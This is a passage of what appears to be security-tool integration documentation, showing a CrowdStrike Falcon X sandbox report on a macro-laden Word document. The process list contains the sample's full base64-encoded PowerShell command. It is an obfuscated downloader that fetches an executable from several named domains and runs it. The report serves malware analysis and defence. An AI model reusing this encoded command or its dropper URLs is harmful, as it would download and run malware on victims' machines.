| File.Name | String | The name of the file. | 
| File.SHA256 | String | The SHA256 hash of the file. | 
| File.Type | String | The type of the file. | 
| File.Malicious.Description | Unknown | A description explaining why the file was determined to be malicious | 
| File.Malicious.Vendor | String | For malicious files, the vendor that made the decision. | 
| File.Size | Number | The size of the file. | 
| File.Relationships.EntityA | String | The source of the relationship. | 
| File.Relationships.EntityAType | String | The type of the source of the relationship. | 
| File.Relationships.EntityB | String | The destination of the relationship. | 
| File.Relationships.EntityBType | String | The type of the destination of the relationship. | 
| File.Relationships.Relationship | String | The name of the relationship. | 


#### Command Example
```!cs-fx-get-full-report ids="20879a8064904ecfbb62c118a6a19411_a71f2c6e06a94e8495615803c66d8730"```

#### Context Example
```json
{
    "DBotScore": {
        "Indicator": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
        "Reliability": "B - Usually reliable",
        "Score": 3,
        "Type": "file",
        "Vendor": "CrowdStrike Falcon X"
    },
    "File": {
        "Malicious": {
            "Description": null,
            "Vendor": "CrowdStrike Falcon X"
        },
        "Name": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
        "Relationships": [
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "digiwebmarketing.com",
                "EntityBType": "Domain",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "haoqunkong.com",
                "EntityBType": "Domain",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "11.11.11.11",
                "EntityBType": "IP",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "holfve.se",
                "EntityBType": "Domain",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "10.10.10.10",
                "EntityBType": "IP",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "www.cfm.nl",
                "EntityBType": "Domain",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "www.techtravel.events",
                "EntityBType": "Domain",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "11.11.11.11",
                "EntityBType": "IP",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "11.11.11.11",
                "EntityBType": "IP",
                "Relationship": "communicates-with"
            },
            {
                "EntityA": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
                "EntityAType": "File",
                "EntityB": "10.10.10.10",
                "EntityBType": "IP",
                "Relationship": "communicates-with"
            }
        ],
        "SHA256": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
        "Size": 177195,
        "Type": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word, Create Time/Date: Wed Jul 22 23:12:00 2020, Last Saved Time/Date: Wed Jul 22 23:12:00 2020, Number of Pages: 1, Number of Words: 3, Number of Characters: 21, Security: 0"
    },
    "csfalconx": {
        "resource": {
            "architecture": "Unknown",
            "classification": [
                "54.2% (.DOC) Microsoft Word document",
                "32.2% (.DOC) Microsoft Word document (old ver.)",
                "13.5% (.) Generic OLE2 / Multistream Compound File"
            ],
            "classification_tags": [
                "macros-on-open"
            ],
            "contacted_hosts": [
                {
                    "address": "11.11.11.11",
                    "associated_runtime": [
                        {
                            "name": "powershell.exe",
                            "pid": 2168
                        }
                    ],
                    "country": "Sweden",
                    "port": 80,
                    "protocol": "TCP"
                },
                {
                    "address": "11.11.11.11",
                    "associated_runtime": [
                        {
                            "name": "powershell.exe",
                            "pid": 2168
                        }
                    ],
                    "country": "Sweden",
                    "port": 443,
                    "protocol": "TCP"
                },
                {
                    "address": "10.10.10.10",
                    "associated_runtime": [
                        {
                            "name": "powershell.exe",
                            "pid": 2168
                        }
                    ],
                    "country": "Netherlands",
                    "port": 80,
                    "protocol": "TCP"
                }
            ],
            "created_timestamp": "2022-02-13T14:20:21Z",
            "dns_requests": [
                {
                    "country": "-",
                    "domain": "digiwebmarketing.com"
                },
                {
                    "country": "-",
                    "domain": "haoqunkong.com"
                },
                {
                    "address": "11.11.11.11",
                    "country": "Sweden",
                    "domain": "holfve.se"
                },
                {
                    "address": "10.10.10.10",
                    "country": "Netherlands",
                    "domain": "www.cfm.nl"
                },
                {
                    "country": "-",
                    "domain": "www.techtravel.events"
                }
            ],
            "environment_description": "Windows 7 64 bit",
            "environment_id": 110,
            "extracted_files": [
                {
                    "description": "MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Archive, ctime=Sun Feb 13 13:20:43 2022, mtime=Sun Feb 13 13:20:43 2022, atime=Sun Feb 13 13:21:03 2022, length=177195, window=hide",
                    "file_size": 733,
                    "md5": "b03553bdceb835c58f1b51735e7cf04a",
                    "name": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee.LNK",
                    "sha1": "9c015a1c3552dbd411667fcb60384fa6bd014365",
                    "sha256": "366d6cb9d39b5e26cd66b5b27dec197003d0e8fb05db2c4745344eadcf489686",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "lnk"
                    ]
                },
                {
                    "description": "data",
                    "file_size": 162,
                    "md5": "0559c884ed3069a35c5cdadc2990b4ef",
                    "name": "~_0d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee.doc",
                    "sha1": "61c1599c3e1558638cb28b4c6f9f232f92796992",
                    "sha256": "1b1c76592534d82c6226312c5de1547378fda8fafdeeaf6e9671678786f609b1",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "data"
                    ]
                },
                {
                    "description": "ASCII text, with very long lines, with no line terminators",
                    "file_size": 555,
                    "md5": "ce27ac7cc19db6e2a8a6728e5f353511",
                    "name": "overlay_63752fb6b0edfce41c0dca4d020c92b1b53d5542f71ad6f4c9ec6debd2ab54cb",
                    "sha1": "f637eb39e413e25cc21b6ee32eaf5df98b9a34b4",
                    "sha256": "63752fb6b0edfce41c0dca4d020c92b1b53d5542f71ad6f4c9ec6debd2ab54cb",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "text"
                    ]
                },
                {
                    "description": "data",
                    "file_size": 224,
                    "md5": "1e80569cfa1b6bde2012b79f002ec17d",
                    "name": "index.dat",
                    "sha1": "9e4a1197e81e87fc830612bcb43e530dc273d932",
                    "sha256": "75217309e7a8f10d3e2dec572a750870e9fae5c8014c781642d1f781b66d34aa",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "data"
                    ]
                },
                {
                    "description": "data",
                    "file_size": 30,
                    "md5": "546e75a597c887a92ec27b04fa0a79c1",
                    "name": "MSO1049.acl",
                    "sha1": "eed24e837648539f216e6cdb595e4ba9ae8b1e4d",
                    "sha256": "6dc497f4d8eff3b3236740a833c7e97dbbd42830519bc2b945b471402becc217",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "data"
                    ]
                },
                {
                    "description": "data",
                    "file_size": 1024,
                    "md5": "5d4d94ee7e06bbb0af9584119797b23a",
                    "name": "~WRS_1CB23E96-C153-4A77-9E11-6460DFC9E50F_.tmp",
                    "sha1": "dbb111419c704f116efa8e72471dd83e86e49677",
                    "sha256": "4826c0d860af884d3343ca6460b0006a7a2ce7dbccc4d743208585d997cc5fd1",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "data"
                    ]
                },
                {
                    "description": "data",
                    "file_size": 8016,
                    "md5": "a1c5216942f6c7cb2033c2704d6f0e81",
                    "name": "K3XS2GFN4FZVOVR1RKRM.temp",
                    "sha1": "24323488ebf134658cdb0f4f2fb02476664b1563",
                    "sha256": "20bcab45c85ff05270d6960c0837818609742214b770f6b4b0683636ab4d551d",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "data"
                    ]
                },
                {
                    "description": "data",
                    "file_size": 162,
                    "md5": "0559c884ed3069a35c5cdadc2990b4ef",
                    "name": "~_Normal.dotm",
                    "sha1": "61c1599c3e1558638cb28b4c6f9f232f92796992",
                    "sha256": "1b1c76592534d82c6226312c5de1547378fda8fafdeeaf6e9671678786f609b1",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "data"
                    ]
                },
                {
                    "description": "data",
                    "file_size": 147284,
                    "md5": "232d0879a34a3bb4d61a2f477148b4ba",
                    "name": "MSForms.exd",
                    "sha1": "a06ef60064e5204bac234f4930bb5b51b6477ece",
                    "sha256": "90a548b96302e7fef25a537187dd23dc9800d7b34824137729e80f23131f00b9",
                    "threat_level_readable": "no specific threat",
                    "type_tags": [
                        "data"
                    ]
                }
            ],
            "file_size": 177195,
            "file_type": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word, Create Time/Date: Wed Jul 22 23:12:00 2020, Last Saved Time/Date: Wed Jul 22 23:12:00 2020, Number of Pages: 1, Number of Words: 3, Number of Characters: 21, Security: 0",
            "file_type_short": [
                "doc",
                "office"
            ],
            "http_requests": [
                {
                    "header": "GET /images/1ckw5mj49w_2k11px_d/ HTTP/1.1\nHost: holfve.se\nConnection: Keep-Alive",
                    "host": "holfve.se",
                    "host_ip": "11.11.11.11",
                    "host_port": 80,
                    "method": "GET",
                    "url": "/images/1ckw5mj49w_2k11px_d/"
                },
                {
                    "header": "GET /_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/ HTTP/1.1\nHost: www.cfm.nl\nConnection: Keep-Alive",
                    "host": "www.cfm.nl",
                    "host_ip": "10.10.10.10",
                    "host_port": 80,
                    "method": "GET",
                    "url": "/_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/"
                }
            ],
            "id": "20879a8064904ecfbb62c118a6a19411_a71f2c6e06a94e8495615803c66d8730",
            "incidents": [
                {
                    "details": [
                        "Contacts 5 domains and 5 hosts"
                    ],
                    "name": "Network Behavior"
                }
            ],
            "ioc_report_broad_csv_artifact_id": "3e39d3d16589c1d96807c613d1c54e045195fc25cb862a400599889bd5e4d5bf",
            "ioc_report_broad_json_artifact_id": "07f57cd4324036cff270b08a7fcaaf4da1adfda9672566d129d9839c7c1397e4",
            "ioc_report_broad_maec_artifact_id": "f2e7d975e00804d78b2f747218b255390fdade7f4fd9532e9062f68f86d95659",
            "ioc_report_broad_stix_artifact_id": "6c57045b1c1b4230e8710d5cfea236371724affe42608af27632847204e2d070",
            "ioc_report_strict_csv_artifact_id": "c8d5f442aac8d212cf256d594ab85016da9e145c432527cbe25a2c4611fc84c8",
            "ioc_report_strict_json_artifact_id": "e968cf9ec879d33bd8050e4f7482787b1a5ae3411ed9856cadc4a4781948c19d",
            "ioc_report_strict_maec_artifact_id": "bed2275bc623943da3bbb598321a6c83fee690834b3579e651e755bbd410c395",
            "ioc_report_strict_stix_artifact_id": "079c858d1bde436e5d85f24210c1656463dc466a4fc7039527e7a943d8c0dc76",
            "processes": [
                {
                    "command_line": "/n \"C:\\d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee.doc\"",
                    "file_accesses": [
                        {
                            "mask": "FILE_READ_DATA",
                            "path": "\\DEVICE\\NETBT_TCPIP_{846EE342-7039-11DE-9D20-806E6F6E6963}",
                            "type": "CREATE"
                        },
                        {
                            "mask": "FILE_READ_DATA",
                            "path": "\\DEVICE\\NETBT_TCPIP_{C3450F58-7060-4AEA-B0A0-C245927D78D0}",
                            "type": "CREATE"
                        }
                    ],
                    "handles": [
                        {
                            "id": 1,
                            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Components\\8CD521FB6DFE3D115AF2000A9CAC24AB",
                            "type": "KeyHandle"
                        },
                        {
                            "id": 336,
                            "path": "\\Device\\KsecDD",
                            "type": "FileHandle"
                        },
                        {
                            "id": 752,
                            "path": "\\Device\\MountPointManager",
                            "type": "FileHandle"
                        },
                        {
                            "id": 788,
                            "path": "\\\\?\\Volume{e47f4f43-d86",
                            "type": "FileHandle"
                        },
                        {
                            "id": 796,
                            "path": "\\Device\\Ide\\IdeDeviceP1T0L0-1",
                            "type": "FileHandle"
                        },
                        {
                            "id": 876,
                            "path": "\\RPC Control\\OLEADE38AD686674C2EB8E3744832E8",
                            "type": "PortHandle"
                        }
                    ],
                    "icon_artifact_id": "704c608c047fcf38c06387d35d2557c67a40f933bcbf5e49ff38bb96917f44b9",
                    "mutants": [
                        "\\Sessions\\1\\BaseNamedObjects\\Global\\552FFA80-3393-423d-8671-7BA046BB5906",
                        "Local\\ZonesCacheCounterMutex",
                        "Global\\552FFA80-3393-423d-8671-7BA046BB5906",
                        "Local\\10MU_ACB10_S-1-5-5-0-70188",
                        "Global\\MTX_MSO_Formal1_S-1-5-21-686412048-2446563785-1323799475-1001",
                        "Local\\10MU_ACBPIDS_S-1-5-5-0-70188",
                        "Local\\ZonesLockedCacheCounterMutex",
                        "Global\\MTX_MSO_AdHoc1_S-1-5-21-686412048-2446563785-1323799475-1001",
                        "\\Sessions\\1\\BaseNamedObjects\\Local\\10MU_ACBPIDS_S-1-5-5-0-70188",
                        "\\Sessions\\1\\BaseNamedObjects\\Local\\10MU_ACB10_S-1-5-5-0-70188",
                        "\\Sessions\\1\\BaseNamedObjects\\Local\\ZonesCacheCounterMutex",
                        "\\Sessions\\1\\BaseNamedObjects\\Local\\ZonesLockedCacheCounterMutex",
                        "\\Sessions\\1\\BaseNamedObjects\\Global\\MTX_MSO_Formal1_S-1-5-21-686412048-2446563785-1323799475-1001",
                        "\\Sessions\\1\\BaseNamedObjects\\Global\\MTX_MSO_AdHoc1_S-1-5-21-686412048-2446563785-1323799475-1001",
                        "\\Sessions\\1\\BaseNamedObjects\\Local\\WinSpl64To32Mutex_1127b_0_3000"
                    ],
                    "name": "WINWORD.EXE",
                    "normalized_path": "%PROGRAMFILES%\\(x86)\\Microsoft Office\\Office14\\WINWORD.EXE",
                    "pid": 1704,
                    "sha256": "ee944590b3c253325688f3c1cddc9a439b5a80a3a36443b4b5de788db19d2973",
                    "uid": "00000000-00001704"
                },
                {
                    "command_line": "12288",
                    "file_accesses": [
                        {
                            "mask": "FILE_READ_DATA",
                            "path": "\\DEVICE\\NETBT_TCPIP_{846EE342-7039-11DE-9D20-806E6F6E6963}",
                            "type": "CREATE"
                        },
                        {
                            "mask": "FILE_READ_DATA",
                            "path": "\\DEVICE\\NETBT_TCPIP_{C3450F58-7060-4AEA-B0A0-C245927D78D0}",
                            "type": "CREATE"
                        }
                    ],
                    "handles": [
                        {
                            "id": 1,
                            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize",
                            "type": "KeyHandle"
                        },
                        {
                            "id": 184,
                            "path": "\\RPC Control\\splwow64_1_1127b_0_3000",
                            "type": "PortHandle"
                        }
                    ],
                    "mutants": [
                        "Local\\ZonesCacheCounterMutex",
                        "Global\\552FFA80-3393-423d-8671-7BA046BB5906",
                        "Local\\10MU_ACB10_S-1-5-5-0-70188",
                        "Global\\MTX_MSO_Formal1_S-1-5-21-686412048-2446563785-1323799475-1001",
                        "Local\\10MU_ACBPIDS_S-1-5-5-0-70188",
                        "Local\\ZonesLockedCacheCounterMutex",
                        "Global\\MTX_MSO_AdHoc1_S-1-5-21-686412048-2446563785-1323799475-1001",
                        "_SHuassist.mtx",
                        "Global\\.net clr networking",
                        "RasPbFile"
                    ],
                    "name": "splwow64.exe",
                    "normalized_path": "%WINDIR%\\splwow64.exe",
                    "parent_uid": "00000000-00001704",
                    "pid": 1820,
                    "process_flags": [
                        {
                            "name": "Reduced Monitoring"
                        }
                    ],
                    "sha256": "232f4854a70cfa982352c3eebc7e308755aac8e1a9dc5352711243def1f4b096",
                    "uid": "00000000-00001820"
                },
                {
                    "command_line": "powersheLL -e JABsAGkAZQBjAGgAcgBvAHUAaAB3AHUAdwA9ACcAdgB1AGEAYwBkAG8AdQB2AGMAaQBvAHgAaABhAG8AbAAnADsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAIgBTAEUAYABjAHUAUgBpAFQAeQBgAFAAUgBPAGAAVABvAEMAYABvAGwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJABkAGUAaQBjAGgAYgBlAHUAZAByAGUAaQByACAAPQAgACcAMwAzADcAJwA7ACQAcQB1AG8AYQBkAGcAbwBpAGoAdgBlAHUAbQA9ACcAZAB1AHUAdgBtAG8AZQB6AGgAYQBpAHQAZwBvAGgAJwA7ACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAGQAZQBpAGMAaABiAGUAdQBkAHIAZQBpAHIAKwAnAC4AZQB4AGUAJwA7ACQAcwBpAGUAbgB0AGUAZQBkAD0AJwBxAHUAYQBpAG4AcQB1AGEAYwBoAGwAbwBhAHoAJwA7ACQAcgBlAHUAcwB0AGgAbwBhAHMAPQAuACgAJwBuACcAKwAnAGUAdwAtAG8AYgAnACsAJwBqAGUAYwB0ACcAKQAgAG4ARQB0AC4AdwBlAEIAYwBsAEkAZQBuAFQAOwAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQA9ACcAaAB0AHQAcABzADoALwAvAGgAYQBvAHEAdQBuAGsAbwBuAGcALgBjAG8AbQAvAGIAbgAvAHMAOQB3ADQAdABnAGMAagBsAF8AZgA2ADYANgA5AHUAZwB1AF8AdwA0AGIAagAvACoAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AdABlAGMAaAB0AHIAYQB2AGUAbAAuAGUAdgBlAG4AdABzAC8AaQBuAGYAbwByAG0AYQB0AGkAbwBuAGwALwA4AGwAcwBqAGgAcgBsADYAbgBuAGsAdwBnAHkAegBzAHUAZAB6AGEAbQBfAGgAMwB3AG4AZwBfAGEANgB2ADUALwAqAGgAdAB0AHAAOgAvAC8AZABpAGcAaQB3AGUAYgBtAGEAcgBrAGUAdABpAG4AZwAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8ANwAyAHQAMABqAGoAaABtAHYANwB0AGEAawB3AHYAaQBzAGYAbgB6AF8AZQBlAGoAdgBmAF8AaAA2AHYAMgBpAHgALwAqAGgAdAB0AHAAOgAvAC8AaABvAGwAZgB2AGUALgBzAGUALwBpAG0AYQBnAGUAcwAvADEAYwBrAHcANQBtAGoANAA5AHcAXwAyAGsAMQAxAHAAeABfAGQALwAqAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBjAGYAbQAuAG4AbAAvAF8AYgBhAGMAawB1AHAALwB5AGYAaAByAG0AaAA2AHUAMABoAGUAaQBkAG4AdwByAHUAdwBoAGEAMgB0ADQAbQBqAHoANgBwAF8AeQB4AGgAeQB1ADMAOQAwAGkANgBfAHEAOQAzAGgAawBoADMAZABkAG0ALwAnAC4AIgBzAGAAUABsAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAHMAZQBjAGMAaQBlAHIAZABlAGUAdABoAD0AJwBkAHUAdQB6AHkAZQBhAHcAcAB1AGEAcQB1ACcAOwBmAG8AcgBlAGEAYwBoACgAJABnAGUAZQByAHMAaQBlAGIAIABpAG4AIAAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQApAHsAdAByAHkAewAkAHIAZQB1AHMAdABoAG8AYQBzAC4AIgBkAE8AVwBOAGAAbABvAEEAYABkAGYAaQBgAEwAZQAiACgAJABnAGUAZQByAHMAaQBlAGIALAAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAYgB1AGgAeABlAHUAaAA9ACcAZABvAGUAeQBkAGUAaQBkAHEAdQBhAGkAagBsAGUAdQBjACcAOwBJAGYAIAAoACgALgAoACcARwBlAHQALQAnACsAJwBJAHQAZQAnACsAJwBtACcAKQAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQAuACIAbABgAGUATgBHAFQASAAiACAALQBnAGUAIAAyADQANwA1ADEAKQAgAHsAKABbAHcAbQBpAGMAbABhAHMAcwBdACcAdwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAnACkALgAiAEMAYABSAGUAYQBUAGUAIgAoACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAcQB1AG8AbwBkAHQAZQBlAGgAPQAnAGoAaQBhAGYAcgB1AHUAegBsAGEAbwBsAHQAaABvAGkAYwAnADsAYgByAGUAYQBrADsAJABjAGgAaQBnAGMAaABpAGUAbgB0AGUAaQBxAHUAPQAnAHkAbwBvAHcAdgBlAGkAaABuAGkAZQBqACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAHQAbwBpAHoAbAB1AHUAbABmAGkAZQByAD0AJwBmAG8AcQB1AGwAZQB2AGMAYQBvAGoAJwA=",
                    "file_accesses": [
                        {
                            "mask": "FILE_READ_DATA",
                            "path": "\\DEVICE\\NETBT_TCPIP_{846EE342-7039-11DE-9D20-806E6F6E6963}",
                            "type": "CREATE"
                        },
                        {
                            "mask": "FILE_READ_DATA",
                            "path": "\\DEVICE\\NETBT_TCPIP_{C3450F58-7060-4AEA-B0A0-C245927D78D0}",
                            "type": "CREATE"
                        }
                    ],
                    "handles": [
                        {
                            "id": 1,
                            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize",
                            "type": "KeyHandle"
                        },
                        {
                            "id": 132,
                            "path": "\\Device\\KsecDD",
                            "type": "FileHandle"
                        },
                        {
                            "id": 244,
                            "path": "\\Device\\MountPointManager",
                            "type": "FileHandle"
                        },
                        {
                            "id": 300,
                            "path": "\\\\?\\Volume{e47f4f43-d86",
                            "type": "FileHandle"
                        },
                        {
                            "id": 324,
                            "path": "\\Device\\Ide\\IdeDeviceP1T0L0-1",
                            "type": "FileHandle"
                        },
                        {
                            "id": 1212,
                            "path": "\\Device\\Afd",
                            "type": "FileHandle"
                        },
                        {
                            "id": 1352,
                            "path": "\\Device\\Nsi",
                            "type": "FileHandle"
                        },
                        {
                            "id": 1372,
                            "path": "\\Device\\NetBT_Tcpip_{E63BE247-2D1C-4749-B86C-7B5FABD92F0C}",
                            "type": "FileHandle"
                        }
                    ],
                    "icon_artifact_id": "704c608c047fcf38c06387d35d2557c67a40f933bcbf5e49ff38bb96917f44b9",
                    "mutants": [
                        "\\Sessions\\1\\BaseNamedObjects\\Global\\.net clr networking",
                        "Local\\ZonesCacheCounterMutex",
                        "Global\\552FFA80-3393-423d-8671-7BA046BB5906",
                        "Local\\10MU_ACB10_S-1-5-5-0-70188",
                        "Global\\MTX_MSO_Formal1_S-1-5-21-686412048-2446563785-1323799475-1001",
                        "Local\\10MU_ACBPIDS_S-1-5-5-0-70188",
                        "Local\\ZonesLockedCacheCounterMutex",
                        "Global\\MTX_MSO_AdHoc1_S-1-5-21-686412048-2446563785-1323799475-1001",
                        "_SHuassist.mtx",
                        "Global\\.net clr networking",
                        "RasPbFile",
                        "\\Sessions\\1\\BaseNamedObjects\\RasPbFile",
                        "\\Sessions\\1\\BaseNamedObjects\\_SHuassist.mtx"
                    ],
                    "name": "powersheLL.exe",
                    "normalized_path": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powersheLL.exe",
                    "pid": 2168,
                    "process_flags": [
                        {
                            "name": "Network Activity"
                        }
                    ],
                    "sha256": "a8fdba9df15e41b6f5c69c79f66a26a9d48e174f9e7018a371600b866867dab8",
                    "uid": "00000000-00002168"
                }
            ],
            "sandbox": {
                "architecture": "Unknown",
                "classification": [
                    "54.2% (.DOC) Microsoft Word document",
                    "32.2% (.DOC) Microsoft Word document (old ver.)",
                    "13.5% (.) Generic OLE2 / Multistream Compound File"
                ],
                "classification_tags": [
                    "macros-on-open"
                ],
                "contacted_hosts": [
                    {
                        "address": "11.11.11.11",
                        "associated_runtime": [
                            {
                                "name": "powershell.exe",
                                "pid": 2168
                            }
                        ],
                        "country": "Sweden",
                        "port": 80,
                        "protocol": "TCP"
                    },
                    {
                        "address": "11.11.11.11",
                        "associated_runtime": [
                            {
                                "name": "powershell.exe",
                                "pid": 2168
                            }
                        ],
                        "country": "Sweden",
                        "port": 443,
                        "protocol": "TCP"
                    },
                    {
                        "address": "10.10.10.10",
                        "associated_runtime": [
                            {
                                "name": "powershell.exe",
                                "pid": 2168
                            }
                        ],
                        "country": "Netherlands",
                        "port": 80,
                        "protocol": "TCP"
                    }
                ],
                "dns_requests": [
                    {
                        "country": "-",
                        "domain": "digiwebmarketing.com"
                    },
                    {
                        "country": "-",
                        "domain": "haoqunkong.com"
                    },
                    {
                        "address": "11.11.11.11",
                        "country": "Sweden",
                        "domain": "holfve.se"
                    },
                    {
                        "address": "10.10.10.10",
                        "country": "Netherlands",
                        "domain": "www.cfm.nl"
                    },
                    {
                        "country": "-",
                        "domain": "www.techtravel.events"
                    }
                ],
                "extracted_files": [
                    {
                        "description": "MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Archive, ctime=Sun Feb 13 13:20:43 2022, mtime=Sun Feb 13 13:20:43 2022, atime=Sun Feb 13 13:21:03 2022, length=177195, window=hide",
                        "file_size": 733,
                        "md5": "b03553bdceb835c58f1b51735e7cf04a",
                        "name": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee.LNK",
                        "sha1": "9c015a1c3552dbd411667fcb60384fa6bd014365",
                        "sha256": "366d6cb9d39b5e26cd66b5b27dec197003d0e8fb05db2c4745344eadcf489686",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "lnk"
                        ]
                    },
                    {
                        "description": "data",
                        "file_size": 162,
                        "md5": "0559c884ed3069a35c5cdadc2990b4ef",
                        "name": "~_0d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee.doc",
                        "sha1": "61c1599c3e1558638cb28b4c6f9f232f92796992",
                        "sha256": "1b1c76592534d82c6226312c5de1547378fda8fafdeeaf6e9671678786f609b1",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "data"
                        ]
                    },
                    {
                        "description": "ASCII text, with very long lines, with no line terminators",
                        "file_size": 555,
                        "md5": "ce27ac7cc19db6e2a8a6728e5f353511",
                        "name": "overlay_63752fb6b0edfce41c0dca4d020c92b1b53d5542f71ad6f4c9ec6debd2ab54cb",
                        "sha1": "f637eb39e413e25cc21b6ee32eaf5df98b9a34b4",
                        "sha256": "63752fb6b0edfce41c0dca4d020c92b1b53d5542f71ad6f4c9ec6debd2ab54cb",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "text"
                        ]
                    },
                    {
                        "description": "data",
                        "file_size": 224,
                        "md5": "1e80569cfa1b6bde2012b79f002ec17d",
                        "name": "index.dat",
                        "sha1": "9e4a1197e81e87fc830612bcb43e530dc273d932",
                        "sha256": "75217309e7a8f10d3e2dec572a750870e9fae5c8014c781642d1f781b66d34aa",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "data"
                        ]
                    },
                    {
                        "description": "data",
                        "file_size": 30,
                        "md5": "546e75a597c887a92ec27b04fa0a79c1",
                        "name": "MSO1049.acl",
                        "sha1": "eed24e837648539f216e6cdb595e4ba9ae8b1e4d",
                        "sha256": "6dc497f4d8eff3b3236740a833c7e97dbbd42830519bc2b945b471402becc217",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "data"
                        ]
                    },
                    {
                        "description": "data",
                        "file_size": 1024,
                        "md5": "5d4d94ee7e06bbb0af9584119797b23a",
                        "name": "~WRS_1CB23E96-C153-4A77-9E11-6460DFC9E50F_.tmp",
                        "sha1": "dbb111419c704f116efa8e72471dd83e86e49677",
                        "sha256": "4826c0d860af884d3343ca6460b0006a7a2ce7dbccc4d743208585d997cc5fd1",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "data"
                        ]
                    },
                    {
                        "description": "data",
                        "file_size": 8016,
                        "md5": "a1c5216942f6c7cb2033c2704d6f0e81",
                        "name": "K3XS2GFN4FZVOVR1RKRM.temp",
                        "sha1": "24323488ebf134658cdb0f4f2fb02476664b1563",
                        "sha256": "20bcab45c85ff05270d6960c0837818609742214b770f6b4b0683636ab4d551d",
                        "threat_level_readable": "no specific threat",
                        "type_tags": [
                            "data"
                        ]
                    },
                    {
                        "description": "data",
                        "file_size": 162,
                        "md5": "0559c884ed3069a35c5cdadc2990b4ef",
                        "name": "~_Normal.dotm",
